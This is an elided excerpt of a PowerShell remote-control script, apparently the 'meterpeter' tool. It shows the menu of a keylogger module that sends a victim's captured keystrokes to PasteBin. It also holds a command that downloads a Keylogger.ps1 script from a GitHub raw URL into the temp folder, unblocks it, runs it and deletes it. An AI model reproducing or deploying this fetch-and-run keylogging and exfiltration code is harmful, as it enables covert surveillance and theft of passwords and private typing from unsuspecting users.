  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "keylogger")
    {
        ...
        If($choise -ieq "PasteBin")
        {
           ...
           write-host "   Recomended settings:"
           write-host "      timeout: 3600 (create one paste each hour) maxpastes: 10 (pasts max)" -ForegroundColor Yellow
           write-host "`n`n   Modules   Description                  Remark" -ForegroundColor green;
           write-host "   -------   -----------                  ------";
           write-host "   Start     Send keystrokes to pastebin  max of 20 pastes allowed by day";
           write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
           write-host "`n`n :meterpeter:PasteBin> " -NoNewline -ForeGroundColor Green;
        ...
        If($choise -ieq "Stop")
        {
           ...
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1`" -OutFile `"`$Env:TMP\Keylogger.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Keylogger.ps1`" -Keylogger Stop;Start-sleep -Seconds 2;Remove-Item -Path `"`$Env:TMP\Keylogger.ps1`" -Force"       
        }
